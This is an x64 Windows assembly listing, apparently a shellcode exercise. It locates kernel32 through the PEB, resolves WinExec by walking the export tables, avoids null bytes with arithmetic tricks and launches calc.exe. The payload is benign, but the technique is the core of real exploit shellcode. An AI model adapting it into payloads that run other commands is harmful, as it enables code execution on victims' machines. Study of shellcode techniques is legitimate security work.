.code
main PROC

	mov rbp, rsp
    sub rsp, 40h
   
    xor rax, rax
    mov [rbp - 8h], rax                 ;Var to store kernel32 base address
    mov [rbp - 10h], rax                ;Var to store pointer to "WinExec"
    mov [rbp - 18h], rax                ;Var to store address of Export Table
    mov [rbp - 1ch], eax                ;Var to store number of exported functions (4 bytes)
    mov [rbp - 24h], rax                ;Var to store address of Export Name Pointer Table
    mov [rbp - 2ch], rax                ;Var to store address of Export Ordinal Table 
    mov [rbp - 34h], rax                ;Var to store address of Export Address Table
    
    mov [rbp - 3ch], rax                ;Var to store pointer to "calc.exe"

    xor rbx, rbx           
    sub ebx, 0ffffffA0h
    mov rbx, gs:[ebx]                   ;pointer to PEB 
    
    mov rbx, [rbx + 18h]                ;pointer to ldr
    mov rbx, [rbx + 20h]                ;Pointer to InMemoryModuleList 
    mov rbx, [rbx]                      ;current process
    mov rbx, [rbx]                      ;ntdll
    mov rbx, [rbx - 10h + 30h]          ;kernel32 base address
  
    mov [rbp - 8h], rbx                 ;Save kernel32 base address

    mov rbx, 0456e6957h                 ;Lower half of 00636578 456e6957
    sub rax, 0FF9C9A88h                 ;Upper half of 00636578 456e6957
    shl rax, 32
	add rax, rbx                        ;rax = 00636578 456e6957
    mov [rbp - 10h], rax                ;Save "WinExec"

    xor rax, rax
    push rax
    mov rax, 6578652e636c6163h          ;calc.exe
    push rax
    mov [rbp - 3ch], rsp                ;Save pointer to "calc.exe"

    mov rax, [rbp - 8h]                 ;kernel32 base address
    mov eax, [rax + 3ch]                ;RVA of PE Header
 
    add rax, [rbp - 8h]                 ;VA of PE Header = kernel32 base address + RVA of PE Header    
    
    xor rbx, rbx
    sub ebx, 0ffffff78h
    add rbx, rax                        ;RVA of Export Table located at 0x88 from PE Header
    
    mov eax, [rbx]                      ;RVA of Export Table

    add rax, [rbp - 8h]                 ;VA of Export Table
    mov [rbp - 18h], rax                ;Save VA of Export Table

    add rax, 14h                        ;VA of Number of Functions
    mov rbx, [rax]                      ;Number of Exported Functions
    mov [rbp - 1ch], ebx                ;Save number of exported functions

    mov rax, [rbp - 18h]                
    add rax, 20h                        ;RVA of Export Name Pointer Table at 0x20 from RVA of Export Table
    mov ebx, [rax]                      ;RVA of Export Name Pointer Table
    add rbx, [rbp - 8h]                 ;VA of Export Name Pointer Table
    
    mov [rbp - 24h], rbx                ;Save VA of Export Name Pointer Table
    
    mov rax, [rbp - 18h]
    add rax, 24h                        ;RVA of Export Ordinal Table at 0x24 from VA of Export Table
    mov ebx, [rax]
    add rbx, [rbp - 8h]                 ;VA of Export Ordinal Table

    mov [rbp - 2ch], rbx                ;Save VA of Export Ordinal Table
 
    mov rax, [rbp - 18h]
    add rax, 1ch                        ;RVA of Export Address Table at 0x1c from VA of Export Table
    mov ebx, [rax]
    add rbx, [rbp - 8h]                 ;VA of Export Address Table

    mov [rbp - 34h], rbx                ;Save VA of Export Address Table

    ;Loop through Export Name Pointer Table and search for WinExec and keep a counter
    xor rax, rax
    
WinExecSearch:
    lea rsi, [rbp - 10h]                ;Pointer to "WinExec"
    mov rdi, [rbp - 24h]                ;Export Name Pointer Table Address
    mov edi, [rdi + rax*4]              ;Ordinal Numbers are 4 bytes each
    add rdi, [rbp - 8h]                 ;VA of current Function
    xor rcx, rcx
    sub rcx, 0fffffff8h                 ;Length("WinExec") = 8
    repe cmpsb                          ;check for [rdi] == [rsi]
    jz WinExecFound
    inc rax                             ;increase counter
    cmp rax, [rbp - 1ch]                ;Check if end of functions is reached
    jnz WinExecSearch
    jmp FunctionNotFound                ;rax exceeds number of functions

WinExecFound:
    mov rbx, [rbp - 2ch]                ;Export Ordinal Table
    mov ax, [rbx + rax * 2]             ;Actual Ordinal Value of WinExec (2 bytes)
    mov rbx, [rbp - 34h]                ;Export Address Table
    mov eax, [rbx + rax * 4]            ;RVA Address of WinExec
    add rax, [rbp - 8h]                 ;VA of WinExec
    
    push rbp 
    mov rcx, [rbp - 3ch]                ;Pointer to "calc.exe"
    xor rdx, rdx
    inc rdx                             ;show window
    sub rsp, 20h                        ;WinExec overwrites first 0x20 bytes of stack, so pushing rsp down by 0x20
    call rax

FunctionNotFound:
Exit:
    mov rsp, rbp
    xor rax, rax
    ret
   
main ENDP

END